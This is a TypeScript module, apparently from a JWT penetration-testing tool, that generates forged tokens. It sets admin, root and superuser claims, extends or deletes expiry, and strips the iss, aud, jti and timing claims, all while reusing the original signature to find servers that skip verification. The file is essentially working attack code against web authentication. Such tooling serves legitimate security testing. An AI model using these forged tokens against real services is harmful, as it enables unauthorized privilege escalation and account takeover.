/**
 * Claim Tampering Attacks
 *
 * Re-issues the token with elevated / modified payload claims while keeping
 * the original algorithm.  Useful as baseline / reference attacks and when
 * combined with other techniques (e.g. kid injection that forces a known key).
 *
 * These attacks intentionally leave the signature INVALID so they surface
 * "no signature verification" bugs.
 */

import { buildJWT } from "../crypto/jwt.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

const ADMIN_FIELDS: Record<string, unknown> = {
  role: "admin",
  admin: true,
  is_admin: true,
  isAdmin: true,
  superuser: true,
  scope: "admin read write",
  permissions: ["admin", "read", "write"],
  group: "admin",
  groups: ["admin"],
  authorities: ["ROLE_ADMIN"],
};

const PRIVILEGE_ESCALATION_PAYLOADS = [
  { label: "Role=Admin", changes: { role: "admin" } },
  { label: "Admin=True", changes: { admin: true, is_admin: true } },
  { label: "Superuser+All Scope", changes: { superuser: true, scope: "openid profile email admin read write" } },
  { label: "Sub='admin'", changes: { sub: "admin" } },
  { label: "Sub='root'", changes: { sub: "root" } },
  { label: "Sub='administrator'", changes: { sub: "administrator" } },
  { label: "Full Admin Blast", changes: { ...ADMIN_FIELDS } },
];

const EXPIRY_MANIPULATIONS = [
  {
    label: "Expiry +10 years",
    mutate: (p: Record<string, unknown>) => {
      const now = Math.floor(Date.now() / 1000);
      return {
        ...p,
        exp: now + 60 * 60 * 24 * 365 * 10,
        nbf: now - 60,
        iat: now,
      };
    },
  },
  {
    label: "Remove expiry",
    mutate: (p: Record<string, unknown>) => {
      const out = { ...p };
      delete out.exp;
      return out;
    },
  },
];

export function buildClaimTamperAttacks(parsed: ParsedJWT): AttackResult[] {
  const results: AttackResult[] = [];

  // Privilege escalation variants — signature left invalid
  for (const { label, changes } of PRIVILEGE_ESCALATION_PAYLOADS) {
    const payload = { ...parsed.payload, ...changes };
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper — ${label}`,
      description:
        `Modifies payload claims (${label}) while preserving the original algorithm. ` +
        "The signature is invalid — surfaces servers that skip verification.",
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now(),
    });
  }

  // Expiry manipulation
  for (const { label, mutate } of EXPIRY_MANIPULATIONS) {
    const payload = mutate(parsed.payload);
    results.push({
      id: nanoid(),
      technique: "claimTamper",
      techniqueName: `Claim Tamper — ${label}`,
      description:
        `${label}: modifies temporal claims while preserving original algorithm and signature. ` +
        "Surfaces servers that do not validate expiry, or where expiry is checked separately from signature.",
      modifiedJWT: buildJWT(parsed.header, payload, parsed.signatureB64),
      timestamp: Date.now(),
    });
  }

  // Strip all security-sensitive claims
  const stripped = { ...parsed.payload };
  for (const k of ["exp", "nbf", "iat", "jti", "iss", "aud"]) delete stripped[k];
  results.push({
    id: nanoid(),
    technique: "claimTamper",
    techniqueName: "Claim Tamper — Strip Security Claims",
    description:
      "Removes exp, nbf, iat, jti, iss, and aud claims with original signature. " +
      "Tests whether the server enforces these validation steps independently.",
    modifiedJWT: buildJWT(parsed.header, stripped, parsed.signatureB64),
    timestamp: Date.now(),
  });

  return results;
}
